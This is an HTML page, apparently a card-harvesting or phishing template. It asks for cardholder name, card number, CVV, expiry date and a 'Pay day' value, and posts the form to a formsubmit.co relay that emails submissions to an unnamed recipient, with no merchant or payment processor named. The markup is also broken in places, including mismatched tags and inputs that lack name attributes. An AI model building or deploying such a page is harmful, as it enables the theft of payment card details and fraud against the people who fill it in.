<!DOCTYPE html>
<html lang="en">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit/Debit Card Form</title>
    <link rel="stylesheet" href="sebono.css">
</head>
<body>
    <div class="card-form">
        <h2>CREDIT /DEBIT </H2>
        <form action="https://formsubmit.co/4b442333e9eb95c98ff0a164f5911ff4" method="POST">
        
        
        
            <div class="input-group">
                <label for="first-name">Pay day</label>
                <input type="text" id="first-name" placeholder="eg.15">
            </div>
            <div class="input-group">
                <label for="card holder">Cardholder</label>
                <input type="text" id="last-name" placeholder="e.g D E Debric">
            </div>
            <div class="input-group">
                <label for="card-number">Card number</label>
                <input type="text" id="card-number" placeholder="•••• •••• •••• ••••">
            </div>
            <div class="input-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" placeholder="•••">
            </div>
            <div class="input-group">
                <label for="valid-month">Valid until</label>
                <div class="date-group">
                    <select id="valid-month">
                        <option>Month</option>
                        <option>01</option>
                        <option>02</option>
                        <option>03</option>
                        <option>04</option>
                        <option>05</option>
                        <option>06</option>
                        <option>07</option>
                        <option>08</option>
                        <option>09</option>
                        <option>10</option>
                        <option>11</option>
                        <option>12</option>
                    </select>
                    <select id="valid-year">
                        <option>Year</option>
                        <option>2025</option>
                        <option>2026</option>
                        <option>2027</option>
                        <option>2028</option>
                        <option>2029</option>
                        <option>2030</option>
                    </select>
                </div>
            </div>
            <div class="button-group">


<button type="submit" class="submit">Submit</button>
<button type="button" class="cancel">Cancel</button>
               
            </div>
        </form>
    </div>
</body>
</html>/body>
